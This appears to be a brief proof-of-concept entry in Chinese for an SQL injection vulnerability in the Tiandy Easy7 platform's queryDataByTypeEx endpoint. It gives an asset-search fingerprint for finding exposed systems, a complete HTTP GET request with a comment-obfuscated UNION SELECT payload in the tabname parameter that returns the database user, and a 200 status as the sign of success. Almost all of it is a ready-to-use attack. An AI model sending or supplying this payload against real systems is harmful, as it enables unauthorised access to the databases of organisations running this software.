# 天地伟业Easy7queryDataByTypeEx存在SQL注入漏洞

天地伟业 ｜ SQL注入 ｜ —
- **指纹**：`app="Tiandy-Easy7"`
- **请求**：`GET /Easy7/rest/workbook/queryDataByTypeEx?tabname=/*!TAB_WORKBOOK_TYPE*/where/**/1=1/**/union/**/select/**/user(),1 HTTP/1.1`
- **响应特征**：200